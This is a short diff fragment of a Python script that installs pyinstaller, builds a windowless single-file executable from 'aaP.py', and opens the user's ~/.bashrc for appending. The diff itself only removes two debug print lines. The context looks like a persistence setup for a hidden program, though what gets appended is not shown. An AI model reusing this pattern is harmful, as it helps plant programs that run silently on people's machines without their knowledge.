@@ -9,9 +9,7 @@ os.system('pip3 install pyinstaller')
 os.system('pyinstaller --onefile -w aaP.py')
 
 user = os.path.expanduser('~')
-print(user)
 path = os.getcwd()
-print(path)
 
 
 file = open(f'{user}/.bashrc','a+')
